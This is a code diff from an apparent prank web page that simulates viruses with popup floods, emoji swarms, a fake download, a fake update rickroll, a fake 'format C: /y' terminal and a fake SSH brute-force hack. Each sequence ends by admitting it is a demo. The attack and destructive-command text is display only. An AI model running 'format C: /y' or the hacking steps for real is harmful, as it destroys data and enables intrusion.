+    const id='fw-'+Date.now()+Math.random();
+    const x=Math.random()*(window.innerWidth-200);
+    const y=Math.random()*(window.innerHeight-120)+60;
+    const t=floodTitles[Math.floor(Math.random()*floodTitles.length)];
+    const el=document.createElement('div');
+    el.className='popup-win'; el.id=id;
+    el.style.cssText=`left:${x}px;top:${y}px;width:${120+Math.random()*80}px;z-index:99998;`;
+    el.innerHTML=`<div class="popup-title" style="font-size:10px;" onmousedown="dragPopup(event,'${id}')"><span>${t}</span><button class="close-x" onclick="document.getElementById('${id}').remove()">✕</button></div>
+    <div style="padding:6px 8px;color:#000;font-size:10px;">⚠️ ${t}</div>
+    <div class="popup-btns"><button class="popup-btn" style="padding:2px 10px;font-size:10px;" onclick="document.getElementById('${id}').remove()">OK</button></div>`;
+    document.body.appendChild(el); floodWins.push(id);
+  },120);
+}
+function stopWindowFlood(){
+  clearInterval(floodInterval); floodInterval=null;
+  floodWins.forEach(id=>{const el=document.getElementById(id);if(el)el.remove();}); floodWins=[];
+  jTerm('WindowFlood.exe — stopped','ok');
+  showNotif('Window flood stopped','🧹');
+}
+
+// — CURSOR CHAOS —
+let cursorInterval=null; let cursorEls=[];
+const cursorEmoji=['👻','💀','☠️','😈','🤡','👾','🦠','🔥','⚡','💥'];
+function startCursorChaos(){
+  if(cursorInterval) return;
+  jTerm('CursorChaos.js — deploying emoji swarm...','warn');
+  showNotif('🖱️ Cursor chaos activated!','🖱️');
+  for(let i=0;i<30;i++){
+    const el=document.createElement('div');
+    el.style.cssText=`position:fixed;pointer-events:none;z-index:999997;font-size:20px;transition:transform ${0.05+Math.random()*.3}s;will-change:transform;`;
+    el.textContent=cursorEmoji[Math.floor(Math.random()*cursorEmoji.length)];
+    document.body.appendChild(el); cursorEls.push({el,ox:Math.random()*40-20,oy:Math.random()*40-20,phase:Math.random()*Math.PI*2});
+  }
+  let mx=200,my=200;
+  document.addEventListener('mousemove',trackMouse);
+  function trackMouse(e){mx=e.clientX;my=e.clientY;}
+  let frame=0;
+  cursorInterval=setInterval(()=>{
+    frame++;
+    cursorEls.forEach((c,i)=>{
+      const t=frame*0.05+c.phase;
+      const x=mx+c.ox*Math.sin(t*0.7+i)*2;
+      const y=my+c.oy*Math.cos(t*0.5+i)*2;
+      c.el.style.left=(x-10)+'px'; c.el.style.top=(y-10)+'px';
+    });
+  },30);
+}
+function stopCursorChaos(){
+  clearInterval(cursorInterval); cursorInterval=null;
+  cursorEls.forEach(c=>c.el.remove()); cursorEls=[];
+  document.removeEventListener('mousemove',()=>{});
+  jTerm('CursorChaos.js — stopped','ok');
+  showNotif('Cursor chaos stopped','🧹');
+}
+
+// — FAKE DOWNLOAD —
+function runFakeDownload(){
+  const id='fdl-'+Date.now();
+  const el=document.createElement('div');
+  el.id=id;
+  el.className='popup-win';
+  el.style.cssText=`bottom:60px;right:20px;position:fixed;width:340px;z-index:999999;`;
+  el.innerHTML=`<div class="popup-title"><span>📥 Downloading SalienWin.exe...</span><button class="close-x" onclick="document.getElementById('${id}').remove()">✕</button></div>
+  <div style="padding:12px 16px;color:#000;">
+    <div style="font-size:12px;margin-bottom:8px;">SalienWin.exe (847 KB)</div>
+    <div style="background:#fff;border:1px solid #888;height:18px;position:relative;">
+      <div id="dl-bar" style="background:#0000cc;height:100%;width:0%;"></div>
+    </div>
+    <div id="dl-status" style="font-size:11px;margin-top:6px;">Connecting...</div>
+  </div>`;
+  document.body.appendChild(el);
+  let p=0;
+  const iv=setInterval(()=>{
+    p+=Math.random()*8+2;
+    if(p>100)p=100;
+    document.getElementById('dl-bar').style.width=p+'%';
+    document.getElementById('dl-status').textContent=p<100?`Downloading... ${Math.floor(p)}% (${Math.floor(p*8.47)} KB of 847 KB)`:'✅ Download complete!';
+    if(p>=100){
+      clearInterval(iv);
+      setTimeout(()=>{
+        document.getElementById('dl-status').textContent='😈 VIRUS INSTALLED SUCCESSFULLY. Just kidding! [DEMO]';
+        document.getElementById('dl-bar').style.background='#f00';
+      },800);
+    }
+  },100);
+  jTerm('FakeDownload.php — simulating download...','warn');
+  showNotif('📥 Fake download started!','📥');
+}
+
+// — RICKROLL —
+function runRickroll(){
+  const id='rick-'+Date.now();
+  const el=document.createElement('div');
+  el.id=id; el.className='popup-win';
+  el.style.cssText=`left:50%;top:50%;transform:translate(-50%,-50%);width:500px;z-index:999999;position:fixed;`;
+  el.innerHTML=`<div class="popup-title"><span>⬛ cmd.exe — Windows Update</span><button class="close-x" onclick="document.getElementById('${id}').remove()">✕</button></div>
+  <div style="background:#0c0c0c;padding:12px 16px;font-family:'Courier New',monospace;font-size:12px;color:#c0c0c0;min-height:200px;" id="rick-term">
+    <div>Microsoft Windows Update Manager v11.0</div>
+    <div>Checking for updates...</div>
+  </div>`;
+  document.body.appendChild(el);
+  const term=document.getElementById('rick-term');
+  const lines=[
+    {t:500,msg:'Connecting to update server...'},
+    {t:1200,msg:'Downloading KB5034441... [██████░░░░] 62%'},
+    {t:2000,msg:'Downloading KB5034441... [██████████] 100%'},
+    {t:2600,msg:'Installing update package...'},
+    {t:3200,msg:'Verifying signature... OK'},
+    {t:4000,msg:'Configuring Windows features...'},
+    {t:4800,msg:'Almost done...'},
+    {t:5600,msg:'⚠ Update complete. Applying final patch...'},
+    {t:6400,msg:'<span style="color:#0f0;font-size:14px;">🎵 Never gonna give you up, never gonna let you down!</span>'},
+    {t:7200,msg:'<span style="color:#0f0;">🎵 Never gonna run around and desert you!</span>'},
+    {t:8000,msg:'<span style="color:#ff0;font-size:13px;">😂 YOU HAVE BEEN RICKROLLED. No updates were installed.</span>'},
+  ];
+  lines.forEach(({t,msg})=>setTimeout(()=>{term.innerHTML+=`<div>${msg}</div>`;term.scrollTop=term.scrollHeight;},t));
+  jTerm('rickroll.bat — installing "updates"...','warn');
+  showNotif('🎵 Installing updates...','📦');
+}
+
+// — FAKE FORMAT —
+function runFakeFormat(){
+  const id='fmt-'+Date.now();
+  const el=document.createElement('div');
+  el.id=id; el.className='popup-win';
+  el.style.cssText=`left:50%;top:50%;transform:translate(-50%,-50%);width:480px;z-index:999999;position:fixed;`;
+  el.innerHTML=`<div class="popup-title"><span>⬛ C:\\Windows\\System32\\cmd.exe</span><button class="close-x" onclick="document.getElementById('${id}').remove()">✕</button></div>
+  <div style="background:#0c0c0c;padding:12px 16px;font-family:'Courier New',monospace;font-size:12px;color:#c0c0c0;min-height:220px;" id="fmt-term"></div>`;
+  document.body.appendChild(el);
+  const term=document.getElementById('fmt-term');
+  const steps=[
+    {t:0,   msg:'C:\\> format C: /y'},
+    {t:600, msg:'<span style="color:#ff4444;">WARNING: ALL DATA ON C: WILL BE LOST!</span>'},
+    {t:1400,msg:'Formatting C:...'},
+    {t:2000,msg:'[░░░░░░░░░░░░░░░░░░░░] 0%'},
+    {t:2600,msg:'[████░░░░░░░░░░░░░░░░] 18%'},
+    {t:3200,msg:'[████████░░░░░░░░░░░░] 37%'},
+    {t:3800,msg:'[████████████░░░░░░░░] 58%'},
+    {t:4400,msg:'[████████████████░░░░] 79%'},
+    {t:5000,msg:'[████████████████████] 100%'},
+    {t:5600,msg:'Volume label (11 characters, ENTER for none)?'},
+    {t:6200,msg:'Creating file system structures...'},
+    {t:7000,msg:'<span style="color:#f00;">Deleting: C:\\Windows\\System32...</span>'},
+    {t:7600,msg:'<span style="color:#f00;">Deleting: C:\\Users\\...</span>'},
+    {t:8400,msg:'<span style="color:#ff0;">Format complete. 476.8 GB freed.</span>'},
+    {t:9200,msg:'<span style="color:#0f0;">Just kidding! This was a FAKE demo. Nothing was deleted. 😄</span>'},
+  ];
+  steps.forEach(({t,msg})=>setTimeout(()=>{term.innerHTML+=`<div>${msg}</div>`;term.scrollTop=term.scrollHeight;},t));
+  jTerm('format_C.bat — fake formatting C: drive...','err');
+  showNotif('💾 Fake format started!','💾');
+}
+
+// — FAKE HACKER —
+function runFakeHacker(){
+  const id='hack-'+Date.now();
+  const el=document.createElement('div');
+  el.id=id; el.className='popup-win';
+  el.style.cssText=`left:50%;top:50%;transform:translate(-50%,-50%);width:520px;z-index:999999;position:fixed;`;
+  el.innerHTML=`<div class="popup-title" style="background:linear-gradient(90deg,#000,#003300);"><span>💻 im_hacking_u.sh — ROOT TERMINAL</span><button class="close-x" onclick="document.getElementById('${id}').remove()">✕</button></div>
+  <div style="background:#000;padding:12px 16px;font-family:'Courier New',monospace;font-size:12px;color:#00ff00;min-height:260px;max-height:340px;overflow-y:auto;" id="hack-term"></div>`;
+  document.body.appendChild(el);
+  const term=document.getElementById('hack-term');
+  const msgs=[
+    {t:0,   msg:'Initializing connection to victim machine...'},
+    {t:700, msg:'Scanning open ports on 192.168.1.105...'},
+    {t:1300,msg:'PORT 22 (SSH): OPEN\nPORT 80 (HTTP): OPEN\nPORT 3389 (RDP): OPEN'},
+    {t:2100,msg:'Attempting SSH brute force... (wordlist: rockyou.txt)'},
+    {t:2700,msg:'Trying: admin:admin ... FAIL\nTrying: root:password ... FAIL\nTrying: admin:123456 ... SUCCESS!'},
+    {t:3500,msg:'<span style="color:#0ff;">✓ SSH LOGIN SUCCESSFUL: root@192.168.1.105</span>'},
+    {t:4200,msg:'I AM IN YOUR SYSTEM, LOLOLOLOL'},
+    {t:4800,msg:'Downloading your files...\n  /home/victim/passwords.txt ████████ DONE\n  /home/victim/wallet.dat    ████████ DONE'},
+    {t:5700,msg:'Installing backdoor...'},
+    {t:6300,msg:'Setting up persistence via cron...'},
+    {t:7100,msg:'Uploading all data to 127.0.0.1 (nice try)...'},
+    {t:7900,msg:'<span style="color:#ff0;">TRACEROUTE back to hacker:</span>\n  1. 192.168.1.1\n  2. 10.0.0.1\n  3. Hacker located: MOM\'S BASEMENT, USA'},
+    {t:8800,msg:'<span style="color:#f00;">jk lol this is a FAKE demo 😂 nothing was hacked</span>'},
+  ];
+  msgs.forEach(({t,msg})=>setTimeout(()=>{term.innerHTML+=`<div style="white-space:pre-wrap;">${msg}</div>`;term.scrollTop=term.scrollHeight;},t));
+  jTerm('im_hacking_u.sh — fake hack sequence initiated...','warn');
+  showNotif('👨‍💻 HACKING INITIATED [FAKE]','👨‍💻');
+}
+
+// — EMOJI RAIN —
+let emojiRainInterval=null; let emojiEls=[];
+const rainEmoji=['😈','☠️','💀','🦠','🔥','💥','⚡','👾','🤡','💣','🎭','🌊','❄️','🌈','🍕','🦄','🚀','👻','🎉','🤖'];
+function startEmojiRain(){
+  if(emojiRainInterval) return;
+  jTerm('EmojiRain.js — activating emoji rain...','ok');
+  showNotif('🌧️ Emoji rain started!','🌧️');
+  emojiRainInterval=setInterval(()=>{
+    if(emojiEls.length>200){stopEmojiRain();return;}
+    const el=document.createElement('div');
+    el.style.cssText=`position:fixed;top:-40px;left:${Math.random()*window.innerWidth}px;font-size:${20+Math.random()*24}px;z-index:999996;pointer-events:none;transition:none;animation:none;`;
+    el.textContent=rainEmoji[Math.floor(Math.random()*rainEmoji.length)];
+    document.body.appendChild(el); emojiEls.push(el);
+    let y=-40, speed=2+Math.random()*5, rot=0, rspeed=(Math.random()-.5)*8;
+    const anim=()=>{
+      y+=speed; rot+=rspeed;
+      el.style.top=y+'px'; el.style.transform=`rotate(${rot}deg)`;
+      if(y<window.innerHeight+60) requestAnimationFrame(anim);
+      else { el.remove(); emojiEls=emojiEls.filter(e=>e!==el); }
+    };
+    requestAnimationFrame(anim);
+  },80);
+}
+function stopEmojiRain(){
+  clearInterval(emojiRainInterval); emojiRainInterval=null;
+  emojiEls.forEach(el=>el.remove()); emojiEls=[];
+  jTerm('EmojiRain.js — stopped','ok');
+  showNotif('Emoji rain stopped','🧹');
+}
+
+// ─────────────────────────────────────────
+//  INIT
+// ─────────────────────────────────────────
+window.addEventListener('load',()=>{
+  buildLocker();
+  renderVirusList();
+  renderProcessTable(null);
+});
 </script>
 </body>
 </html>
